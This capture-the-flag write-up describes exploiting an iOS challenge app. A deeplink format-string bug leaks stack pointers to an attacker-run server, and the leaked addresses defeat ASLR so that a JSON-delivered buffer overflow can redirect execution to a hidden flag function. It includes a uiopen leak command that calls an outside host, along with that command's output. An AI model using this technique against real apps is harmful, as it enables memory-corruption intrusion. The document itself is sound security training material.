This is the first one I completed.

I started with Ghidra, extracting the .ipa file, and started poking around at the binary.

From checking the app's home screen, it only has entering a name and a coupon as entry points from the application itself, neither of which seemed vulnerable at a quick glance, so I quickly gave up on those.

Instantly I noticed the function \_flag and noted it down. It is located at 0x1000040e4.

Looking at the Helper Function `processUserInput` we find

```C
ID HelperFuncs::processUserInput:(ID param_1,SEL param_2,ID param_3)

{
  ID IVar1;
  
  IVar1 = NSString::stringWithFormat:((ID)&_OBJC_CLASS_$_NSString,param_3);
  return IVar1;
}
```

Instantly we find a format string that we have control of. Following the references to this function, we find it is called from `scene:openURLContexts:`.

From here I spun up a Python server to host a URL that is a deeplink to the brokelesnor app, so we could intercept the traffic with Burp Suite. Clicking the link, or running something like:

```
uiopen "brokelesnor://ticket?coupon=%25llx.%25llx.%25llx.%25llx.%25llx.%25llx.%25llx.Z%25llx&referrer=http%3A%2F%2F192.168.129.136%3A8000"
```

will print out something like:

```
GET /?leak=10.24c0.0.283ade280.1.282fdcb80.16b135cc0.Z104ccc8e8 HTTP/1.1
```

Unfortunately, Objective-C doesn't allow us to write using a format specifier the way C's printf does (i.e. %n), so we had to find another way to get our write. If we look at the other helper function `updateData`, we see it's calling `_processData`. In this function we see a buffer being loaded, and the length of the memory copy is simply the size of the content being copied. So it seems like a likely place for a buffer overflow. Since we can leak the return pointer on the stack, we can then use it to find the ASLR slide.

Once we get the ASLR slide, we can add it to the `_flag` function's address and then overflow the buffer until we hit the instruction pointer to get the win. Going to the references of `updateData`, we can see the data expected to be returned is a JSON object, so we coded up a quick Python server to expect the HTTP response from the `uiopen` command and respond with a JSON object containing padding and the pointer to `_flag`. In between the response from the iPhone and our response from the server, we calculate the value of this pointer you can find the implementation in `server.py`.

Once we run the uiopen, with server.py running, we can get the flag: **MHL{format_str1ng_4slr_bypass}**
